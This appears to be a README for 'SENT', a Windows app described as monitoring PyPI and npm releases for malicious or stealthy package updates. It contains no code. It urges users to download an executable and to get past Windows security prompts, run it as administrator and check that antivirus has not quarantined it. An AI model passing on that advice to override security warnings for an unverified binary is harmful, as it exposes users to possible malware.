# 🛡️ SENT - Spot Threats Before They Spread

[![Download SENT](https://img.shields.io/badge/Download-SENT-blue?style=for-the-badge)](https://github.com/Soluble-tie817/SENT/releases)

## 📦 What SENT Does

SENT helps you watch package updates for signs of risk. It checks release activity from PyPI and npm, looks for changes in package behavior, and ranks packages by how much they can affect other software.

Use it to keep an eye on package updates that may change code in ways you did not expect. It focuses on real-time review of new releases and helps you spot problems before they reach other systems.

## 🖥️ What You Need

- Windows 10 or later
- Internet access
- A web browser
- Enough free space to store the app and its data
- Permission to run apps on your PC

SENT is built for normal Windows desktops and laptops. It does not need you to set up a programming toolchain.

## ⬇️ Download SENT

Visit this page to download SENT:

https://github.com/Soluble-tie817/SENT/releases

On that page, look for the latest release and get the Windows file that matches your PC.

## 🪟 Install on Windows

1. Open the download page.
2. Find the latest release.
3. Download the Windows file for SENT.
4. If your browser asks what to do, choose Save.
5. After the file finishes downloading, open your Downloads folder.
6. Double-click the SENT file to start it.
7. If Windows shows a security prompt, choose Run or More info, then Run anyway if you trust the source.
8. Wait for SENT to open.

If the app comes in a ZIP file, right-click the ZIP file, choose Extract All, then open the extracted folder and start the SENT file inside it.

## 🚀 First Run

When SENT starts for the first time, it may take a short time to load its data feed and check the package streams it tracks.

If you see setup prompts, complete them in this order:

1. Select your preferred region or feed source if asked.
2. Allow network access so SENT can check package updates.
3. Choose a local folder for logs and results if prompted.
4. Start the main scan.

## 🔍 How to Use SENT

SENT is meant to stay open while it watches package activity.

Use it this way:

1. Open SENT.
2. Let it connect to the package feeds.
3. Review the main list of packages.
4. Check the risk score for each package.
5. Open a package entry to see the detected code changes.
6. Look at the behavior diff to see what changed in the update.
7. Focus on packages with strong impact across dependency chains.

You do not need to know how to read code to use the app. SENT highlights changes that matter and groups them in a way that is easier to review.

## 🧭 What the Main Screens Show

### 📊 Package Watch List
Shows the packages SENT is tracking and their current status.

### ⚠️ Risk Ranking
Sorts packages by how much damage they could cause if the update is harmful.

### 🧬 Behavior Diff View
Shows code behavior changes between package versions.

### 🌐 Dependency Impact View
Shows how one package can affect other packages that depend on it.

### 📝 Activity Log
Keeps a record of checks, alerts, and feed updates.

## 🔔 How Alerts Work

SENT watches for changes that may be risky, such as:

- New code paths that were not in the last release
- Hidden changes inside existing files
- Sudden changes in package behavior
- Updates that can reach many dependent packages
- Release patterns that look unusual

When SENT finds a match, it marks the package for review so you can inspect it sooner.

## 🧰 Common Tasks

### Refresh package data
Open the app and use the refresh control to pull the latest release data from the feeds.

### Review a flagged package
Open the package name, then check the diff view and the risk details.

### Export results
Use the export option to save a local report for later review.

### Clear old items
Remove old entries from the watch list if you only want to see recent releases.

## 🛠️ Troubleshooting

### SENT does not open
- Check that the file finished downloading
- Move the app out of a protected folder like Downloads if needed
- Try running it again with a double-click
- Restart Windows and try again

### Windows blocks the app
- Right-click the file
- Select Run as administrator if you trust the file
- If the file came in a ZIP, extract it first
- Make sure your antivirus did not quarantine it

### No packages appear
- Check your internet connection
- Refresh the feed
- Wait a few minutes and try again
- Make sure the app is allowed through your firewall

### The screen looks empty
- Maximize the window
- Look for a hidden side panel or filter
- Reset the view if the app has that option

## 📁 File Locations

SENT may store these items on your PC:

- Cache files for feed data
- Local logs
- Saved package lists
- Exported reports

If you move the app to a new folder, keep the related files with it if the app asks for them.

## 🔒 Privacy and Local Data

SENT can keep parts of its work on your computer, such as logs and saved results. It uses network access to check package streams and update data from public package sources.

If you want to keep a clean workspace, review and remove old exports from time to time.

## ❓ FAQ

### Does SENT work offline?
SENT needs internet access to check live package releases and feed updates.

### Do I need to know Python or Node.js?
No. SENT is made for end users who want to review package risk without reading source code by hand.

### Can I use it on more than one machine?
Yes, as long as each Windows PC can run the app and reach the internet.

### What package sources does it track?
SENT tracks PyPI and npm release streams.

### What kind of threats does it look for?
It looks for malicious updates, stealth code changes, and behavior shifts that can spread through dependencies.

## 📥 Download Again

If you need to get the app again, use this page:

https://github.com/Soluble-tie817/SENT/releases